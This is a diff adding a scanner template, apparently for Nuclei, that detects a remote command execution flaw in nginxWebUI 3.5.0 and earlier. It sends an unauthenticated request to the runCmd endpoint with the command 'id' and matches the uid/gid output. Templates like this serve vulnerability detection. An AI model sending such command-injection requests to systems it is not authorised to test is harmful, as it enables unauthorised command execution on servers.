@@ -1,0 +1,26 @@
+id: nginxwebui-runcmd-rce
+name: nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution
+severity: critical
+confidence: confirmed
+description: nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability
+  by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization.
+reference: https://github.com/qingchenhh/qc_poc/blob/main/Goby/nginxWebUI_runCmd_rce.go
+tags:
+- nginx
+- nginxwebui
+- rce
+- vuln
+requests:
+- method: GET
+  path: /AdminPage/conf/runCmd?cmd=id
+  matchers:
+  - type: regex
+    regex:
+    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
+  - type: header
+    words:
+    - application/json
+  - type: status
+    status:
+    - 200
+  condition: and
